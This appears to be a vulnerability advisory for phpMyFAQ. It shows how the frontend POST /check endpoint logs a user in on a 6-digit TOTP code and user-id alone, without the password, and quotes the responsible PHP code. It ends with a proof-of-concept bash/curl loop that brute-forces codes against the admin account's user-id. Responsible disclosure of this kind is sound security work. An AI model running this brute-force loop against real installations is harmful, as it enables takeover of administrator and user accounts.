@@ -1,0 +1,89 @@
+Summary
+The public two-factor verification endpoint POST /check logs a user in based solely on a valid
+6-digit TOTP token and a chosen user-id. It does not require — and is not bound to — a prior
+successful password authentication. For any account that has 2FA enabled, an unauthenticated attacker
+can authenticate without knowing the password, reducing the account to a single factor (a 6-digit
+code) that is itself brute-forceable because this endpoint has no lockout (see Finding #2). This is an
+authentication bypass of the primary credential for all 2FA-protected accounts, including administrators.
+
+Details
+src/phpMyFAQ/Controller/Frontend/AuthenticationController.php:255-283:
+
+#[Route(path: '/check', name: 'public.auth.check', methods: ['POST'])]
+public function check(Request $request): RedirectResponse
+{
+    if ($this->currentUser->isLoggedIn()) {
+        return new RedirectResponse(url: './');
+    }
+
+    $token  = Filter::filterVar($request->request->get('token'), FILTER_SANITIZE_SPECIAL_CHARS);
+    $userId = (int) Filter::filterVar($request->request->get('user-id'), FILTER_VALIDATE_INT);
+
+    if ($userId <= 0) { /* ... */ }
+
+    $this->currentUserService->getUserById($userId);          // loads attacker-chosen user
+
+    if (strlen((string) $token) === 6) {
+        $result = $this->twoFactor->validateToken($token, $userId);
+        if ($result) {
+            $this->currentUserService->twoFactorSuccess();    // full login, no password ever checked
+            return new RedirectResponse(url: './');
+        }
+    }
+    // ...
+}
+twoFactorSuccess() performs a complete session login (src/phpMyFAQ/User/CurrentUser.php:239-247):
+
+public function twoFactorSuccess(): bool
+{
+    $this->setLoggedIn(true);
+    $this->updateSessionId(true);
+    $this->saveToSession();
+    $this->setSuccess(true);
+    return true;
+}
+There is no server-side state (such as a "password already verified for this user" flag) tying the
+/check step to the password step. Compare the admin flow, which does it correctly via a
+2fa_pending_user_id session value set only after the password is validated
+(src/phpMyFAQ/Controller/Administration/AuthenticationController.php:218-262) — proving the frontend
+omission is a regression, not an intended design.
+
+validateToken() (src/phpMyFAQ/User/TwoFactor.php:87-101) returns false when the user has no secret,
+so this is not a universal bypass of all accounts — it specifically defeats the password factor of
+every 2FA-enabled account:
+
+public function validateToken(string $token, int $userId): bool
+{
+    if (strlen($token) !== 6 || $userId <= 0) { return false; }
+    $this->currentUser->getUserById($userId);
+    $secret = $this->currentUser->getUserData('secret');
+    if (!is_string($secret) || $secret === '') { return false; }   // no 2FA -> false
+    return $this->twoFactorAuth->verifyCode($secret, $token);       // 6-digit TOTP only
+}
+Because /check has no failed-attempt lockout and the per-account login throttle is disabled by default
+(Finding #2), the 6-digit code can be brute-forced across TOTP windows. The net effect: 2FA, intended to
+strengthen the password, becomes the only barrier and is independently guessable.
+
+PoC
+Pre-req: a target account (e.g. admin) has 2FA enabled (a common hardening choice). The attacker knows
+or enumerates the numeric user-id (1 = first/admin account in default installs).
+
+# No password required. Submit user-id + a 6-digit TOTP guess to /check.
+# Iterate the token space; the session cookie returned on success is an authenticated session.
+for code in $(seq -w 0 999999); do
+  curl -ks -c jar.txt -b jar.txt \
+    -X POST "https://target/check" \
+    --data-urlencode "user-id=1" \
+    --data-urlencode "token=$(printf '%06d' 10#$code)" \
+    -o /dev/null -w "%{http_code} %{redirect_url}\n" \
+  | grep -q './'   && echo "[+] logged in with token $code" && break
+done
+# A successful guess yields a logged-in session in jar.txt -> full account takeover (no password used).
+If the attacker already controls or has phished the victim's TOTP device, a single request authenticates
+with no password at all.
+
+Impact
+Authentication bypass (CWE-287) / missing authentication for a critical step (CWE-306). The password —
+the primary credential — is never required for any 2FA-enabled account. Combined with the absent lockout,
+this enables full account takeover of users and administrators. Impacted: any deployment where users
+enable two-factor authentication.
